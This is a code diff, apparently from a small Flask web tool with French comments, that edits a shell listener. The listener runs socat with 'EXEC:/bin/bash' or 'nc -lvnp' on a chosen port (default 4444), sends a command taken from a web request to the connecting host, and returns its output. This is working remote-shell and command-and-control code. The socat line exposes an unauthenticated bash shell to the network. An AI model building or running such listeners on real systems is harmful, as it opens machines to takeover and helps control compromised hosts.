@@ -14,24 +14,26 @@ def run_listener(port, command):
     global listener_active, listener_output
     listener_active = True
     try:
-        listener_output = f"Recherche d'outil... (port {port})"
+        listener_output = f"Recherche d'outil disponible... (port {port})"
         use_socat = shutil.which("socat") is not None
         use_nc = shutil.which("nc") is not None
 
         if use_socat:
+            # socat lance un shell interactif, mais stdin n'est pas simple à manipuler ici
             cmd = ["socat", f"TCP4-LISTEN:{port},reuseaddr,fork", "EXEC:/bin/bash"]
             listener_output = f"[+] Listener lancé avec socat sur le port {port}..."
         elif use_nc:
+            # netcat en mode écoute verbose, on peut envoyer des commandes via stdin
             cmd = ["bash", "-c", f"nc -lvnp {port}"]
             listener_output = f"[+] Listener lancé avec netcat sur le port {port}..."
         else:
-            listener_output = "[-] Aucun outil (socat ou netcat) trouvé."
+            listener_output = "[-] Aucun outil (socat ou netcat) trouvé sur le système."
             listener_active = False
             return
 
         proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
 
-        # Attente d'une connexion
+        # On attend une ligne de sortie, qui indique la connexion entrante
         for _ in range(30):
             line = proc.stdout.readline()
             if line:
@@ -44,12 +46,12 @@ def run_listener(port, command):
             listener_active = False
             return
 
-        # Envoi de la commande
+        # Avec netcat, on peut envoyer la commande; avec socat c'est plus compliqué (stdin non connecté)
         if use_nc:
             proc.stdin.write(command + "\n")
             proc.stdin.flush()
 
-        # Lecture des lignes de sortie
+        # Lecture de la sortie de la commande
         output_lines = []
         for _ in range(10):
             line = proc.stdout.readline()
@@ -67,14 +69,15 @@ def run_listener(port, command):
 
 @app.route("/")
 def index():
-    return render_template("index.html")
+    return render_template("index.html")  # ta page HTML doit gérer les appels AJAX
 
 @app.route("/start_listener", methods=["POST"])
 def start_listener():
     global listener_thread, listener_active
     if not listener_active:
-        port = request.json.get("port", 4444)
-        command = request.json.get("command", "id")
+        data = request.get_json(force=True)
+        port = int(data.get("port", 4444))
+        command = data.get("command", "id")
         listener_thread = threading.Thread(target=run_listener, args=(port, command))
         listener_thread.start()
         return jsonify({"status": f"Listener démarré sur le port {port}..."})
